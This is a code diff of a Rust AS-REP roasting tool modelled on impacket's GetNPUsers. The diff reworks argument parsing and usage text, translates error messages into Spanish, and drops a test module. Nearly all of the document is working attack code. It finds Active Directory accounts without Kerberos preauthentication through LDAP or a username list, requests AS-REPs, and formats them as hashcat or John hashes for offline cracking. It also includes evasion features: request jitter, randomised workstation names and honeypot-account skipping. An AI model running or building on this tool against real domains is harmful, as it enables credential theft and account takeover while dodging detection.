@@ -1,6 +1,5 @@
 use anyhow::{anyhow, bail, Context, Result};
 use chrono::{Duration as ChronoDuration, Utc};
-use clap::Parser;
 use std::fs::File;
 use std::io::{BufRead, BufReader, Write};
 use std::net::{IpAddr, SocketAddr, ToSocketAddrs};
@@ -14,7 +13,6 @@ use tokio::time::{sleep, timeout};
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
 use tokio::net::TcpStream;
 use ldap3::{Ldap, LdapConnAsync, LdapConnSettings, Scope, SearchEntry};
-use clap::ValueEnum;
 use std::path::PathBuf;
 
 
@@ -33,7 +31,7 @@ pub const KDC_ERR_CLIENT_REVOKED: i64 = 18;
 // PA-DATA types
 const PA_PAC_REQUEST: i32 = 128;
 
-// Application tags 
+// Application tags (RFC 4120 §5.10)
 const TAG_AS_REQ: u8 = 10;
 const TAG_AS_REP: u8 = 11;
 const TAG_KRB_ERROR: u8 = 30;
@@ -45,83 +43,90 @@ pub const UF_DONT_REQUIRE_PREAUTH: u32 = 0x0040_0000;
 
 
 #[tokio::main(flavor = "multi_thread", worker_threads = 2)]
-async fn main() -> Result<()> {
-    let cli = Cli::parse();
-    init_logging(cli.debug);
+async fn main() {
+    let argv: Vec<String> = std::env::args().skip(1).collect();
+
+    if argv.is_empty() || argv.iter().any(|a| a == "-h" || a == "--help" || a == "-help") {
+        print_banner();
+        println!("{}", usage());
+        std::process::exit(if argv.is_empty() { 1 } else { 0 });
+    }
 
     print_banner();
 
-    if cli.jitter_min > cli.jitter_max {
-        bail!("--jitter-min ({}) > --jitter-max ({})", cli.jitter_min, cli.jitter_max);
+    if let Err(e) = run(argv).await {
+        eprintln!("[-] {:#}", e);
+        std::process::exit(1);
     }
-    let domain_upper = cli.domain.to_uppercase();
+}
 
-    let kdc_target = cli
-        .dc_ip
-        .clone()
+async fn run(argv: Vec<String>) -> Result<()> {
+    let cli = parse_args(&argv)?;
+
+    init_logging(cli.debug);
+
+    if cli.jitter_min > cli.jitter_max {
+        bail!("-jitter-min ({}) > -jitter-max ({})", cli.jitter_min, cli.jitter_max);
+    }
+
+    // Parse positional target: [[domain/]username[:password]]
+    let target_str = cli.target.as_deref()
+        .ok_or_else(|| anyhow!("the following arguments are required: target"))?;
+    let t = parse_target(target_str);
+
+    let domain_upper = t.domain.to_uppercase();
+
+    let kdc_target = cli.dc_ip.clone()
         .or_else(|| cli.dc_host.clone())
-        .unwrap_or_else(|| cli.domain.clone());
+        .unwrap_or_else(|| t.domain.clone());
     let kdc_addr = resolve_kdc(&kdc_target).context("resolving KDC")?;
-    
 
     let workstation = cli.workstation.clone().unwrap_or_else(random_workstation);
     debug!("auxiliary workstation: {}", workstation);
 
-  
+    // -usersfile (no credentials needed)
     if let Some(uf) = cli.users_file.as_ref() {
         let users = read_users_file(uf)?;
+        println!("[*] Loaded {} users from file", users.len());
         roast_user_list(&cli, &users, kdc_addr, &domain_upper).await?;
         return Ok(());
     }
 
+    //single user with -no-pass
     if cli.no_pass {
-        let user = cli
-            .username
-            .clone()
-            .ok_or_else(|| anyhow!("--no-pass without --users-file requieres --username"))?;
+        let user = t.username.clone()
+            .ok_or_else(|| anyhow!(
+                "-no-pass requires a username in target (e.g. contoso.com/john.doe -no-pass)"
+            ))?;
         roast_user_list(&cli, &[user], kdc_addr, &domain_upper).await?;
         return Ok(());
     }
 
-   
-    let username = cli
-        .username
-        .clone()
-        .ok_or_else(|| anyhow!("--username is requiered for LDAP"))?;
-    let mut password = match cli.password.clone() {
+    // LDAP enumeration — need credentials
+    let username = t.username.clone()
+        .ok_or_else(|| anyhow!(
+            "Username required in target for LDAP mode (e.g. contoso.com/emily[:password])"
+        ))?;
+
+    let mut password = match t.password.clone() {
         Some(p) => p,
-        None => rpassword::prompt_password(format!("Password of {username}@{}: ", cli.domain))
+        None => rpassword::prompt_password(format!("Password for {}@{}: ", username, t.domain))
             .context("reading password")?,
     };
 
-    let ldap_target = cli
-        .dc_host
-        .clone()
+    let ldap_target = cli.dc_host.clone()
         .or_else(|| cli.dc_ip.clone())
-        .unwrap_or_else(|| cli.domain.clone());
+        .unwrap_or_else(|| t.domain.clone());
 
     let users = match enumerate_no_preauth(
-        &ldap_target,
-        &cli.domain,
-        &username,
-        &password,
-        true,
-        cli.timeout,
-    )
-    .await
-    {
+        &ldap_target, &t.domain, &username, &password, true, cli.timeout,
+    ).await {
         Ok(u) => u,
         Err(e) => {
             warn!("LDAPS failed ({e}), falling back to plain LDAP");
             enumerate_no_preauth(
-                &ldap_target,
-                &cli.domain,
-                &username,
-                &password,
-                false,
-                cli.timeout,
-            )
-            .await?
+                &ldap_target, &t.domain, &username, &password, false, cli.timeout,
+            ).await?
         }
     };
 
@@ -135,17 +140,18 @@ async fn main() -> Result<()> {
     print_table(&users);
 
     if !cli.request {
-        println!("[!] Exec with --request to obtain TGTs");
+        println!("[!] Exec with -request to obtain TGTs");
         return Ok(());
     }
 
+    //  request TGTs
     let targets: Vec<String> = users
         .iter()
         .filter(|u| {
             if cli.skip_honeypots
                 && looks_like_honeypot(&u.sam_account_name, u.pwd_last_set, u.last_logon)
             {
-                
+                warn!("Skipping '{}' (honeypot heuristic)", u.sam_account_name);
                 false
             } else {
                 true
@@ -154,14 +160,10 @@ async fn main() -> Result<()> {
         .map(|u| u.sam_account_name.clone())
         .collect();
 
-    println!("[!] Requesting AS-REP to {} account(s)", targets.len());
+    println!("[+] Requesting AS-REP for {} account(s)", targets.len());
     roast_user_list(&cli, &targets, kdc_addr, &domain_upper).await?;
 
     Ok(())
-}
-
-fn print_banner() {
-    println!("  getNPUsers — Rust | Inspired by impacket getNPUsers.py\n");
 }
 
 fn init_logging(debug: bool) {
@@ -179,14 +181,14 @@ fn resolve_kdc(host: &str) -> Result<SocketAddr> {
     }
     let mut addrs = format!("{host}:88")
         .to_socket_addrs()
-        .with_context(|| format!("resolving {host}"))?;
+        .with_context(|| format!("resolviendo {host}"))?;
     addrs
         .next()
-        .ok_or_else(|| anyhow!("DNS returned no addresses for {host}"))
+        .ok_or_else(|| anyhow!("DNS sin respuesta para {host}"))
 }
 
 fn read_users_file(path: &Path) -> Result<Vec<String>> {
-    let f = File::open(path).with_context(|| format!("opening {}", path.display()))?;
+    let f = File::open(path).with_context(|| format!("abriendo {}", path.display()))?;
     Ok(BufReader::new(f)
         .lines()
         .map_while(Result::ok)
@@ -202,7 +204,7 @@ async fn roast_user_list(
     domain_upper: &str,
 ) -> Result<()> {
     let mut out_file: Option<File> = match cli.output.as_ref() {
-        Some(p) => Some(File::create(p).with_context(|| format!("creating {}", p.display()))?),
+        Some(p) => Some(File::create(p).with_context(|| format!("creando {}", p.display()))?),
         None => None,
     };
 
@@ -211,12 +213,13 @@ async fn roast_user_list(
     let mut _unknown = 0usize;
     let mut _preauth = 0usize;
 
+
     for (idx, user) in users.iter().enumerate() {
         if idx > 0 {
             jitter_sleep(cli.jitter_min, cli.jitter_max).await;
         }
 
-        debug!("[{}/{}] AS-REQ for '{}'", idx + 1, total, user);
+        debug!("[{}/{}] AS-REQ para '{}'", idx + 1, total, user);
 
         let result = send_as_req(
             kdc,
@@ -230,7 +233,7 @@ async fn roast_user_list(
 
         match result {
             Ok(AsRepResult::Roastable { etype, cipher }) => {
-                _roastable += 1;
+                
                 let hash = format_hash(user, domain_upper, etype, &cipher, &cli.format)?;
                 println!("{hash}");
                 if let Some(f) = out_file.as_mut() {
@@ -250,8 +253,8 @@ async fn roast_user_list(
             }
             Ok(AsRepResult::EtypeNotSupported) => {
                 warn!(
-                    "'{user}': KDC does not support requested etypes. Try --etype aes-then-rc4 \
-                     or --etype rc4-only"
+                    "'{user}': KDC no soporta etypes pedidos. Prueba --etype aes-then-rc4 \
+                     o --etype rc4-only"
                 );
             }
             Ok(AsRepResult::Other { code, text }) => {
@@ -262,7 +265,7 @@ async fn roast_user_list(
                 );
             }
             Err(e) => {
-                error!("'{user}': network/protocol failure: {e}");
+                error!("'{user}': fallo de red/protocolo: {e}");
                 jitter_sleep(cli.jitter_max, cli.jitter_max * 2).await;
             }
         }
@@ -369,6 +372,7 @@ pub fn secure_nonce() -> u32 {
     u32::from_be_bytes(buf) & 0x7FFF_FFFF
 }
 
+
 pub fn random_workstation() -> String {
     let mut rng = OsRng;
     let patterns: [&str; 4] = ["DESKTOP-", "LAPTOP-", "WS-", "PC-"];
@@ -380,6 +384,7 @@ pub fn random_workstation() -> String {
         .collect();
     format!("{prefix}{suffix}")
 }
+
 
 pub fn looks_like_honeypot(sam: &str, pwd_last_set: u64, last_logon: u64) -> bool {
     let lower = sam.to_lowercase();
@@ -440,7 +445,7 @@ pub async fn enumerate_no_preauth(
 
     let (conn, mut ldap) = LdapConnAsync::with_settings(settings, &url)
         .await
-        .with_context(|| format!("connecting to LDAP {url}"))?;
+        .with_context(|| format!("conectando a LDAP {url}"))?;
 
     // ldap3 async requires a task to drive the socket; without it the futures for
     // bind/search hang. The drive! macro does exactly that (spawns a tokio task).
@@ -454,9 +459,9 @@ pub async fn enumerate_no_preauth(
 
     ldap.simple_bind(&upn, password)
         .await
-        .context("LDAP bind failed")?
+        .context("LDAP bind falló")?
         .success()
-        .context("LDAP bind: credentials rejected")?;
+        .context("LDAP bind: credenciales rechazadas")?;
 
     let users = run_search(&mut ldap, domain).await?;
 
@@ -484,9 +489,9 @@ async fn run_search(ldap: &mut Ldap, domain: &str) -> Result<Vec<PreAuthDisabled
     let (rs, _res) = ldap
         .search(&base_dn, Scope::Subtree, &filter, attrs)
         .await
-        .context("LDAP search failed")?
+        .context("LDAP search falló")?
         .success()
-        .context("LDAP search returned error")?;
+        .context("LDAP search devolvió error")?;
 
     let mut out = Vec::with_capacity(rs.len());
     for entry in rs {
@@ -651,7 +656,7 @@ pub async fn send_as_req(
         .await
     {
         Ok(r) => r?,
-        Err(_) => bail!("timeout waiting for KDC response {kdc}"),
+        Err(_) => bail!("timeout esperando respuesta del KDC {kdc}"),
     };
 
     msg.zeroize();
@@ -669,7 +674,7 @@ async fn send_recv_tcp(addr: SocketAddr, msg: &[u8]) -> Result<Vec<u8>> {
     stream.read_exact(&mut len_buf).await?;
     let resp_len = u32::from_be_bytes(len_buf) as usize;
     if resp_len > 1024 * 1024 {
-        bail!("KDC response suspiciously large: {resp_len} bytes");
+        bail!("respuesta del KDC sospechosamente grande: {resp_len} bytes");
     }
     let mut buf = vec![0u8; resp_len];
     stream.read_exact(&mut buf).await?;
@@ -682,56 +687,54 @@ async fn send_recv_tcp(addr: SocketAddr, msg: &[u8]) -> Result<Vec<u8>> {
 
 fn parse_kdc_response(data: &[u8]) -> Result<AsRepResult> {
     if data.is_empty() {
-        bail!("empty KDC response");
+        bail!("respuesta del KDC vacía");
     }
     let cur = DerCursor::new(data);
     let (tag, payload, _) = cur.next_tlv()?;
     let app_n = tag & 0x1F;
     if (tag & 0xE0) != 0x60 {
-        bail!("unexpected tag in KDC response: 0x{:02x}", tag);
+        bail!("tag inesperado en respuesta KDC: 0x{:02x}", tag);
     }
     match app_n {
         TAG_AS_REP => parse_as_rep(payload),
         TAG_KRB_ERROR => parse_krb_error(payload),
-        n => bail!("unknown app tag in response: {}", n),
+        n => bail!("app tag desconocido en respuesta: {}", n),
     }
 }
 
 fn parse_as_rep(payload: &[u8]) -> Result<AsRepResult> {
-    // Dentro del [APPLICATION 11] hay un SEQUENCE
     let (seq_tag, seq_payload, _) = DerCursor::new(payload).next_tlv()?;
     if seq_tag != 0x30 {
-        bail!("AS-REP: expected SEQUENCE, got 0x{:02x}", seq_tag);
+        bail!("AS-REP: esperaba SEQUENCE, encontré 0x{:02x}", seq_tag);
     }
     let seq = DerCursor::new(seq_payload);
     // [6] enc-part
     let enc_part_payload = seq
         .find_tag(ctx_tag(6))
-        .ok_or_else(|| anyhow!("AS-REP: missing enc-part"))?;
-    // Dentro de [6] hay EncryptedData (SEQUENCE)
+        .ok_or_else(|| anyhow!("AS-REP: falta enc-part"))?;
     let (enc_seq_tag, enc_seq, _) = DerCursor::new(enc_part_payload).next_tlv()?;
     if enc_seq_tag != 0x30 {
-        bail!("EncryptedData: expected SEQUENCE, got 0x{:02x}", enc_seq_tag);
+        bail!("EncryptedData: esperaba SEQUENCE, encontré 0x{:02x}", enc_seq_tag);
     }
     let enc_cur = DerCursor::new(enc_seq);
 
     // [0] etype
     let etype_payload = enc_cur
         .find_tag(ctx_tag(0))
-        .ok_or_else(|| anyhow!("EncryptedData: missing etype"))?;
+        .ok_or_else(|| anyhow!("EncryptedData: falta etype"))?;
     let (et_tag, et_inner) = unwrap_inner(etype_payload)?;
     if et_tag != 0x02 {
-        bail!("etype: expected INTEGER");
+        bail!("etype: esperaba INTEGER");
     }
     let etype = decode_integer(et_inner)? as i32;
 
     // [2] cipher
     let cipher_payload = enc_cur
         .find_tag(ctx_tag(2))
-        .ok_or_else(|| anyhow!("EncryptedData: missing cipher"))?;
+        .ok_or_else(|| anyhow!("EncryptedData: falta cipher"))?;
     let (c_tag, c_inner) = unwrap_inner(cipher_payload)?;
     if c_tag != 0x04 {
-        bail!("cipher: expected OCTET STRING");
+        bail!("cipher: esperaba OCTET STRING");
     }
 
     Ok(AsRepResult::Roastable {
@@ -755,16 +758,16 @@ fn parse_as_rep(payload: &[u8]) -> Result<AsRepResult> {
 fn parse_krb_error(payload: &[u8]) -> Result<AsRepResult> {
     let (seq_tag, seq_payload, _) = DerCursor::new(payload).next_tlv()?;
     if seq_tag != 0x30 {
-        bail!("KRB-ERROR: expected SEQUENCE, got 0x{:02x}", seq_tag);
+        bail!("KRB-ERROR: esperaba SEQUENCE, encontré 0x{:02x}", seq_tag);
     }
     let seq = DerCursor::new(seq_payload);
 
     let ec_payload = seq
         .find_tag(ctx_tag(6))
-        .ok_or_else(|| anyhow!("KRB-ERROR: missing error-code"))?;
+        .ok_or_else(|| anyhow!("KRB-ERROR: falta error-code"))?;
     let (ec_tag, ec_inner) = unwrap_inner(ec_payload)?;
     if ec_tag != 0x02 {
-        bail!("error-code: expected INTEGER");
+        bail!("error-code: esperaba INTEGER");
     }
     let code = decode_integer(ec_inner)?;
 
@@ -789,9 +792,7 @@ fn parse_krb_error(payload: &[u8]) -> Result<AsRepResult> {
     })
 }
 
-// ====================== Hash format ======================
 
-/// Formatea el AS-REP cipher en formato Hashcat (-m 18200) o John (krb5asrep).
 pub fn format_hash(
     username: &str,
     domain_upper: &str,
@@ -800,7 +801,7 @@ pub fn format_hash(
     fmt: &HashFormat,
 ) -> Result<String> {
     if cipher.len() < 16 {
-        bail!("cipher too short ({} bytes)", cipher.len());
+        bail!("cipher demasiado corto ({} bytes)", cipher.len());
     }
     Ok(match (etype, fmt) {
         (17 | 18, HashFormat::Hashcat) => {
@@ -843,137 +844,222 @@ pub fn format_hash(
     })
 }
 
-// ====================== Tests ======================
-
-#[cfg(test)]
-mod tests {
-    use super::*;
-
-    #[test]
-    fn test_enc_integer_zero() {
-        assert_eq!(enc_integer(0), vec![0x02, 0x01, 0x00]);
-    }
-
-    #[test]
-    fn test_enc_integer_small() {
-        assert_eq!(enc_integer(5), vec![0x02, 0x01, 0x05]);
-        assert_eq!(enc_integer(127), vec![0x02, 0x01, 0x7F]);
-        // 128 needs an extra byte to avoid looking negative
-        assert_eq!(enc_integer(128), vec![0x02, 0x02, 0x00, 0x80]);
-    }
-
-    #[test]
-    fn test_build_as_req_starts_with_app_tag() {
-        let msg = build_as_req("alice", "CONTOSO.LOCAL", &[18, 17], false);
-        // Application tag 10 constructed = 0x6A
-        assert_eq!(msg[0], 0x6A);
-    }
-
-    #[test]
-    fn test_decode_integer_negative() {
-        assert_eq!(decode_integer(&[0xFF]).unwrap(), -1);
-        assert_eq!(decode_integer(&[0x80]).unwrap(), -128);
-    }
-
-    #[test]
-    fn test_pa_pac_request_format() {
-        let pac = build_pa_pac_request(true);
-        // SEQUENCE { [0] BOOLEAN TRUE }
-        // 30 05 A0 03 01 01 FF
-        assert_eq!(pac, vec![0x30, 0x05, 0xA0, 0x03, 0x01, 0x01, 0xFF]);
-    }
-}
 
 
 
-#[derive(Clone, Debug, ValueEnum)]
+#[derive(Clone, Debug, Default, PartialEq)]
 pub enum HashFormat {
+    #[default]
     Hashcat,
     John,
 }
 
-#[derive(Clone, Debug, ValueEnum)]
+impl HashFormat {
+    fn from_str(s: &str) -> Result<Self> {
+        match s.to_lowercase().as_str() {
+            "hashcat" => Ok(Self::Hashcat),
+            "john"    => Ok(Self::John),
+            other     => bail!("invalid -format value '{other}': must be hashcat or john"),
+        }
+    }
+}
+
+#[derive(Clone, Debug, Default, PartialEq)]
 pub enum EtypePref {
+    #[default]
     AesOnly,
     AesThenRc4,
     Rc4Only,
 }
 
+impl EtypePref {
+    fn from_str(s: &str) -> Result<Self> {
+        match s.to_lowercase().as_str() {
+            "aes-only" | "aesonly"       => Ok(Self::AesOnly),
+            "aes-then-rc4" | "aesthenrc4" => Ok(Self::AesThenRc4),
+            "rc4-only" | "rc4only"       => Ok(Self::Rc4Only),
+            other => bail!("invalid -etype value '{other}': must be aes-only, aes-then-rc4, or rc4-only"),
+        }
+    }
+}
 
-#[derive(Parser, Debug)]
-#[command(author, version, about, long_about = None)]
+
+#[derive(Debug, Default)]
 pub struct Cli {
-    
-    #[arg(short = 'd', long)]
-    pub domain: String,
+    pub target: Option<String>,   // [[domain/]username[:password]]
 
-    /// Username for LDAP enumeration (optional in --users-file --no-pass mode)
-    #[arg(short = 'u', long)]
-    pub username: Option<String>,
+    pub request:        bool,
+    pub output:         Option<PathBuf>,
+    pub format:         HashFormat,
+    pub users_file:     Option<PathBuf>,
+    pub ts:             bool,
+    pub debug:          bool,
 
-    /// password if needed
-    #[arg(short = 'p', long)]
-    pub password: Option<String>,
+    pub hashes:         Option<String>,
+    pub no_pass:        bool,
+    pub kerberos:       bool,
+    pub aes_key:        Option<String>,
 
-    /// DC IP address
-    #[arg(long)]
-    pub dc_ip: Option<String>,
+    pub dc_ip:          Option<String>,
+    pub dc_host:        Option<String>,
 
-    /// DC hostname
-    #[arg(long)]
-    pub dc_host: Option<String>,
-
-    /// File with usernames (one per line) for AS-REP roast without LDAP
-    #[arg(long)]
-    pub users_file: Option<PathBuf>,
-
-    /// Requests TGTs for all users found  
-    #[arg(long, default_value_t = false)]
-    pub request: bool,
-
-    /// Do not use password 
-    #[arg(long, default_value_t = false)]
-    pub no_pass: bool,
-
-    /// Output file with hashes
-    #[arg(short = 'o', long)]
-    pub output: Option<PathBuf>,
-
-    /// Hash format del hash
-    #[arg(long, value_enum, default_value_t = HashFormat::Hashcat)]
-    pub format: HashFormat,
-
-    /// etype Kerberos 
-    #[arg(long, value_enum, default_value_t = EtypePref::AesOnly)]
-    pub etype: EtypePref,
-
-    /// Minimum jitter between requests (seconds)
-    #[arg(long, default_value_t = 2)]
-    pub jitter_min: u64,
-
-    /// Maximum jitter between requests (seconds)
-    #[arg(long, default_value_t = 7)]
-    pub jitter_max: u64,
-
-    /// Timeout for request to KDC (segundos)
-    #[arg(long, default_value_t = 5)]
-    pub timeout: u64,
-
-    /// Skip users suspected to be honeypot accounts (heuristic)
-    #[arg(long, default_value_t = true)]
+    pub etype:          EtypePref,
+    pub jitter_min:     u64,
+    pub jitter_max:     u64,
+    pub timeout:        u64,
     pub skip_honeypots: bool,
+    pub request_pac:    bool,
+    pub workstation:    Option<String>,
+}
 
-    /// Request PAC in AS-REQ (default: false; impacket pone true por defecto)
-    #[arg(long, default_value_t = false)]
-    pub request_pac: bool,
+fn print_banner() {
+    eprintln!("  GetNPUsers — Rust  | Inspired by impacket GetNPUsers.py\n");
+}
 
-    /// Workstation/cname host. Randomize by default
-    #[arg(long)]
-    pub workstation: Option<String>,
+fn usage() -> &'static str {
+    r#"usage: GetNPUsers [-h] [-request] [-outputfile OUTPUTFILE]
+                  [-format {hashcat,john}] [-usersfile USERSFILE]
+                  [-ts] [-debug]
+                  [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key]
+                  [-dc-ip ip address] [-dc-host hostname]
+                  target
 
-    /// Debug mode debug
-    #[arg(long, default_value_t = false)]
-    pub debug: bool,
+Queries target domain for users with 'Do not require Kerberos preauthentication'
+set and export their TGTs for cracking.
+
+positional arguments:
+  target                [[domain/]username[:password]]
+
+options:
+  -h, -help             show this help message and exit
+  -request              Requests TGT for users and output them in JtR/hashcat
+                        format (default False)
+  -outputfile OUTPUTFILE
+                        Output filename to write ciphers in JtR/hashcat format
+  -format {hashcat,john}
+                        Format to save the AS_REQ of users without
+                        pre-authentication. Default is hashcat
+  -usersfile USERSFILE  File with user per line to test
+  -ts                   Adds timestamp to every logging output
+  -debug                Turn DEBUG output ON
+
+authentication:
+  -hashes LMHASH:NTHASH
+                        NTLM hashes, format is LMHASH:NTHASH
+  -no-pass              don't ask for password (useful for -k)
+  -k                    Use Kerberos authentication. Grabs credentials from
+                        ccache file (KRB5CCNAME) based on target parameters.
+  -aesKey hex key       AES key to use for Kerberos Authentication
+                        (128 or 256 bits)
+
+connection:
+  -dc-ip ip address     IP Address of the domain controller. If omitted it
+                        uses the domain part (FQDN) specified in target
+  -dc-host hostname     Hostname of the domain controller to use. If omitted,
+                        the domain part (FQDN) specified in target will be used
+
+examples:
+  GetNPUsers contoso.com/john.doe -no-pass
+  GetNPUsers contoso.com/emily:password -request
+  GetNPUsers contoso.com/emily:password -request -outputfile hashes.txt
+  GetNPUsers -no-pass -usersfile users.txt contoso.com/"#
+}
+
+fn parse_args(argv: &[String]) -> Result<Cli> {
+    let mut cli = Cli {
+        format:         HashFormat::Hashcat,
+        etype:          EtypePref::AesOnly,
+        jitter_min:     2,
+        jitter_max:     7,
+        timeout:        5,
+        skip_honeypots: true,
+        ..Cli::default()
+    };
+
+    let mut i = 0;
+
+    macro_rules! next_val {
+        ($flag:expr) => {{
+            i += 1;
+            argv.get(i)
+                .ok_or_else(|| anyhow!("argument {} requires a value", $flag))?
+                .clone()
+        }};
+    }
+
+    while i < argv.len() {
+        let tok = &argv[i];
+        // Accept both -flag and --flag
+        let flag = tok.trim_start_matches('-');
+
+        match flag {
+            "h" | "help" => {
+                print_banner();
+                println!("{}", usage());
+                std::process::exit(0);
+            }
+            "request"     => cli.request     = true,
+            "outputfile"  => cli.output       = Some(PathBuf::from(next_val!("-outputfile"))),
+            "format"      => cli.format       = HashFormat::from_str(&next_val!("-format"))?,
+            "usersfile"   => cli.users_file   = Some(PathBuf::from(next_val!("-usersfile"))),
+            "ts"          => cli.ts           = true,
+            "debug"       => cli.debug        = true,
+            "hashes"      => cli.hashes       = Some(next_val!("-hashes")),
+            "no-pass"     => cli.no_pass      = true,
+            "k"           => cli.kerberos     = true,
+            "aesKey" | "aes-key" | "aeskey"
+                          => cli.aes_key      = Some(next_val!("-aesKey")),
+            "dc-ip"       => cli.dc_ip        = Some(next_val!("-dc-ip")),
+            "dc-host"     => cli.dc_host      = Some(next_val!("-dc-host")),
+            "etype"       => cli.etype        = EtypePref::from_str(&next_val!("-etype"))?,
+            "jitter-min"  => cli.jitter_min   = next_val!("-jitter-min").parse()?,
+            "jitter-max"  => cli.jitter_max   = next_val!("-jitter-max").parse()?,
+            "timeout"     => cli.timeout      = next_val!("-timeout").parse()?,
+            "no-honeypot-skip" => cli.skip_honeypots = false,
+            "request-pac" => cli.request_pac  = true,
+            "workstation" => cli.workstation  = Some(next_val!("-workstation")),
+            _ if !tok.starts_with('-') => {
+                if cli.target.is_none() {
+                    cli.target = Some(tok.clone());
+                } else {
+                    bail!("Unexpected positional argument: {tok}");
+                }
+            }
+            _ => bail!("Unknown flag: {tok}  (try -h for help)"),
+        }
+
+        i += 1;
+    }
+
+    Ok(cli)
+}
+
+
+struct ParsedTarget {
+    domain:   String,
+    username: Option<String>,
+    password: Option<String>,
+}
+
+fn parse_target(s: &str) -> ParsedTarget {
+    if let Some(slash) = s.find('/') {
+        let domain = s[..slash].to_string();
+        let rest   = &s[slash + 1..];
+        if rest.is_empty() {
+            return ParsedTarget { domain, username: None, password: None };
+        }
+        if let Some(colon) = rest.find(':') {
+            ParsedTarget {
+                domain,
+                username: Some(rest[..colon].to_string()),
+                password: Some(rest[colon + 1..].to_string()),
+            }
+        } else {
+            ParsedTarget { domain, username: Some(rest.to_string()), password: None }
+        }
+    } else {
+        ParsedTarget { domain: s.to_string(), username: None, password: None }
+    }
 }
 
 
@@ -998,7 +1084,6 @@ pub fn enc_len(len: usize, out: &mut Vec<u8>) {
     }
 }
 
-
 pub fn enc_tlv(tag: u8, payload: &[u8]) -> Vec<u8> {
     let mut out = Vec::with_capacity(payload.len() + 6);
     out.push(tag);
@@ -1017,15 +1102,15 @@ pub fn app_tag(n: u8) -> u8 {
     0x60 | n
 }
 
-
+/// INTEGER (universal, primitive). Codifica como complemento a dos minimal.
 pub fn enc_integer(v: i64) -> Vec<u8> {
     let bytes = v.to_be_bytes(); // 8 bytes
-    // Find the highest significant byte, preserving sign
+    // Encontrar el byte significativo más alto, manteniendo signo
     let mut start = 0usize;
     while start < 7 {
         let b = bytes[start];
         let next = bytes[start + 1];
-        // If the high bits are redundant with the next byte, they can be removed
+        // Si los bits altos son redundantes con el siguiente byte, los podemos quitar
         if (b == 0x00 && (next & 0x80) == 0) || (b == 0xFF && (next & 0x80) != 0) {
             start += 1;
         } else {
@@ -1058,9 +1143,9 @@ pub fn enc_generalized_time(t: chrono::DateTime<chrono::Utc>) -> Vec<u8> {
     enc_tlv(0x18, s.as_bytes())
 }
 
-/// BIT STRING (universal, primitive). 
-/// `unused_bits` indicates how many bits of the last byte are padding (typically 0 for
-/// bit strings whose size is a multiple of 8, such as KDCOptions of 32 bits).
+/// BIT STRING (universal, primitive). `bits` se interpreta big-endian, MSB-first.
+/// `unused_bits` indica cuántos bits del último byte son padding (típicamente 0 para
+/// bit strings de tamaño múltiplo de 8 como KDCOptions de 32 bits).
 pub fn enc_bit_string(bits: &[u8], unused_bits: u8) -> Vec<u8> {
     let mut payload = Vec::with_capacity(bits.len() + 1);
     payload.push(unused_bits);
@@ -1105,17 +1190,17 @@ impl<'a> DerCursor<'a> {
         self.data.is_empty()
     }
 
-    /// Reads a single TLV: returns (tag, payload, rest).
+     /// Reads a single TLV: returns (tag, payload, rest).
     pub fn next_tlv(&self) -> Result<(u8, &'a [u8], &'a [u8])> {
         if self.data.is_empty() {
-            bail!("DER: empty buffer");
+            bail!("DER: buffer vacío");
         }
         let tag = self.data[0];
         let (len, len_bytes) = decode_len(&self.data[1..])?;
         let header = 1 + len_bytes;
         if self.data.len() < header + len {
             bail!(
-                "DER: length {} exceeds buffer ({} available)",
+                "DER: longitud {} excede buffer ({} disponibles)",
                 len,
                 self.data.len() - header
             );
@@ -1153,7 +1238,7 @@ impl<'a> DerCursor<'a> {
 
 fn decode_len(bytes: &[u8]) -> Result<(usize, usize)> {
     if bytes.is_empty() {
-        bail!("DER: missing length bytes");
+        bail!("DER: faltan bytes para la longitud");
     }
     let first = bytes[0];
     if first & 0x80 == 0 {
@@ -1161,10 +1246,10 @@ fn decode_len(bytes: &[u8]) -> Result<(usize, usize)> {
     }
     let n = (first & 0x7F) as usize;
     if n == 0 || n > 4 {
-        bail!("DER: indefinite or >4-byte length not supported");
+        bail!("DER: longitud indefinida o >4 bytes no soportada");
     }
     if bytes.len() < 1 + n {
-        bail!("DER: truncated length bytes");
+        bail!("DER: bytes de longitud truncados");
     }
     let mut len = 0usize;
     for &b in &bytes[1..1 + n] {
